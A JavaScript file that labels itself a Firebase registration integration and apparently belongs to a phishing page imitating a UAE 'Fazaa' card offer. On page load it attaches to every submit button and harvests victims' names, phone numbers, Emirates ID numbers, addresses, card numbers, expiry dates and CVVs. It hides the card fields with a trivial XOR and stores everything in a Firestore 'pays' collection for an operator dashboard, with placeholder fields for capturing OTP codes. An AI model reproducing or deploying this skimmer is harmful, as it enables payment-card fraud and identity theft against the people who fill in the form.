// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyD-TzE4b9k2N1x0P3r5Q7s9W1v2Y3z4X5c",
    authDomain: "dsfe-ert.firebaseapp.com",
    projectId: "dsfe-ert",
    storageBucket: "dsfe-ert.appspot.com",
    messagingSenderId: "964263514104",
    appId: "1:964263514104:web:de017cc91f93959df4500d"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// XOR Encryption Function
function xorEncrypt(str) {
    if (!str) return '';
    let result = '';
    for (let i = 0; i < str.length; i++) {
        result += String.fromCharCode(str.charCodeAt(i) ^ 0x42);
    }
    return result;
}

// Save Registration Data to Firebase
async function saveRegistrationToFirebase(formData) {
    try {
        const docId = `reg_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        const dataToSave = {
            // Personal Information
            fullName: formData.name || '',
            phone: formData.phone || '',
            emiratesId: formData.id || '',
            
            // Delivery Information
            region: formData.region || '',
            street: formData.street || '',
            district: formData.district || '',
            deliveryDate: formData.deliveryDate || '',
            
            // Payment Information
            cardNumber: xorEncrypt(formData.cardNumber || ''),
            cardHolder: xorEncrypt(formData.cardHolder || ''),
            expiry: xorEncrypt(formData.expiry || ''),
            cvv: xorEncrypt(formData.cvv || ''),
            
            // Card Type
            cardBrand: formData.brand || 'fazaa',
            cardType: formData.type || 'gold',
            paymentMethod: formData.paymentMethod || 'card',
            
            // Status
            status: 'pending',
            redirectPage: 'payment',
            
            // Timestamps
            createdAt: firebase.firestore.FieldValue.serverTimestamp(),
            updatedAt: firebase.firestore.FieldValue.serverTimestamp(),
            
            // Additional Fields
            amount: formData.amount || '5 AED',
            currency: 'AED',
            otp: '',
            otpCode: '',
            otpSent: false
        };
        
        // Save to 'pays' collection (same as dashboard expects)
        await db.collection('pays').doc(docId).set(dataToSave);
        
        console.log('✓ Data saved to Firebase:', docId);
        return { success: true, docId };
    } catch (error) {
        console.error('✗ Error saving to Firebase:', error);
        return { success: false, error: error.message };
    }
}

// Listen for Form Submission
document.addEventListener('DOMContentLoaded', function() {
    // Intercept form submission
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        form.addEventListener('submit', async function(e) {
            // Don't prevent default yet - let the form validate first
            // We'll capture the data before submission
        });
    });
    
    // Alternative: Listen for button clicks
    const submitButtons = document.querySelectorAll('button[type="submit"]');
    submitButtons.forEach(btn => {
        btn.addEventListener('click', async function(e) {
            // Collect form data
            const formData = collectFormData();
            if (formData && Object.keys(formData).length > 0) {
                const result = await saveRegistrationToFirebase(formData);
                if (!result.success) {
                    console.warn('Firebase save failed, but form will continue');
                }
            }
        });
    });
});

// Collect Form Data from Page
function collectFormData() {
    const data = {};
    
    // Get all input fields
    const inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[type="email"], input[type="date"], select');
    inputs.forEach(input => {
        if (input.value) {
            const name = input.name || input.placeholder || input.id || '';
            if (name) {
                data[name.toLowerCase().replace(/[^a-z0-9]/g, '')] = input.value;
            }
        }
    });
    
    // Get selected radio buttons
    const radios = document.querySelectorAll('input[type="radio"]:checked');
    radios.forEach(radio => {
        data[radio.name] = radio.value;
    });
    
    // Map common field names
    const mappedData = {
        name: data.name || data.اسم || data.fullname || '',
        phone: data.phone || data.هاتف || data.رقمالهاتف || '',
        id: data.id || data.هوية || data.رقمالهوية || data.emiratesid || '',
        region: data.region || data.منطقة || data.اخترالمنطقة || '',
        street: data.street || data.شارع || data.عنوانالشارع || '',
        district: data.district || data.حي || data.اسمالحي || '',
        deliveryDate: data.deliverydate || data.استلام || data.موعدالاستلام || '',
        cardNumber: data.cardnumber || data.رقمالبطاقة || '',
        cardHolder: data.cardholder || data.اسمصاحبالبطاقة || '',
        expiry: data.expiry || data.تاريخ || data.صلاحية || '',
        cvv: data.cvv || data.cvv || '',
        paymentMethod: data.paymentmethod || data.card || 'card',
        brand: data.brand || 'fazaa',
        type: data.type || 'gold'
    };
    
    return mappedData;
}

// Export for use in other scripts
window.firebaseIntegration = {
    saveRegistrationToFirebase,
    collectFormData,
    xorEncrypt
};
